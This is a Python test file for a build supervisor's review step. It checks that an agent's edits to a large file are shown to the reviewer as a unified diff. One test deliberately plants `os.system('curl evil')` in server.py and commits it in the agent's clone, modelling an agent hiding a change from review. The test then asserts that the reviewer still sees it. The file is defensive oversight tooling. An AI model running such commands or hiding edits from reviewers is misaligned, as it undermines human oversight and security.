"""An edit to a large text file is reviewed as its diff (kernel seam 9).

MCPxy phase 7 passed its gate and stopped UNREVIEWABLE_DELTA on a one-line change to a 212 KB
`server.py`: the reviewer was offered whole files only, capped at 100 000 bytes.
"""
import shutil
import tempfile
import unittest
from pathlib import Path

from buildctl.supervisor.git import GitManager
from tests.helpers import git

BIG = "".join(f"def handler_{n}(request):\n    return {n}\n\n" for n in range(6000))  # ~190 KB


class LargeFileReviewTests(unittest.TestCase):
    def setUp(self):
        directory = tempfile.TemporaryDirectory(); self.addCleanup(directory.cleanup)
        base = Path(directory.name).resolve()
        self.repo, self.workspace = base / "repo", base / "workspace"
        self.repo.mkdir()
        git(self.repo, "init", "-q"); git(self.repo, "config", "user.email", "t@test.invalid")
        git(self.repo, "config", "user.name", "T")
        (self.repo / "server.py").write_text(BIG)
        git(self.repo, "add", "."); git(self.repo, "commit", "-qm", "base")
        git(base, "clone", "-q", str(self.repo), str(self.workspace))
        self.manager = GitManager(self.repo, {"git": {}})
        self.baseline = self.manager.manifest(self.workspace)

    def evidence(self, **limits):
        manager = GitManager(self.repo, {"git": {}, "limits": limits}) if limits else self.manager
        delta = manager.attributed_delta(self.workspace, self.baseline, ("server.py", "new.py"))
        return manager.review_evidence(self.workspace, delta, {"passed": True},
                                       base_sha=git(self.repo, "rev-parse", "HEAD"))

    def test_a_small_edit_to_a_large_file_is_reviewable_as_a_diff(self):
        (self.workspace / "server.py").write_text(BIG.replace("return 3000\n", "return 3001\n"))
        evidence = self.evidence()
        self.assertEqual(evidence["unreviewable"], [])
        item = evidence["changed_files"][0]
        self.assertEqual(item["content_encoding"], "unified_diff")
        self.assertIn("-    return 3000", item["content"])
        self.assertIn("+    return 3001", item["content"])
        self.assertLess(len(item["content"]), 5000)

    def test_the_diff_base_is_never_the_agents_own_clone(self):
        """An agent that commits in its clone must not shrink what the reviewer sees."""
        sneaky = BIG.replace("return 10\n", "return os.system('curl evil')\n")
        (self.workspace / "server.py").write_text(sneaky)
        git(self.workspace, "-c", "user.email=a@b.invalid", "-c", "user.name=A", "commit", "-qam", "hide it")
        (self.workspace / "server.py").write_text(sneaky.replace("return 3000\n", "return 3001\n"))
        item = self.evidence()["changed_files"][0]
        self.assertEqual(item["content_encoding"], "unified_diff")
        self.assertIn("curl evil", item["content"], "the reviewer sees every change since the phase base")

    def test_a_new_large_file_is_still_unreviewable(self):
        (self.workspace / "new.py").write_text(BIG)
        self.assertEqual(self.evidence()["unreviewable"], ["new.py"])

    def test_the_cap_is_a_limit(self):
        (self.workspace / "server.py").write_text(BIG + "# end\n")
        item = self.evidence(max_review_file_bytes=500_000)["changed_files"][0]
        self.assertEqual(item["content_encoding"], "utf-8", "under a raised cap the whole file is shown")


if __name__ == "__main__":
    unittest.main()
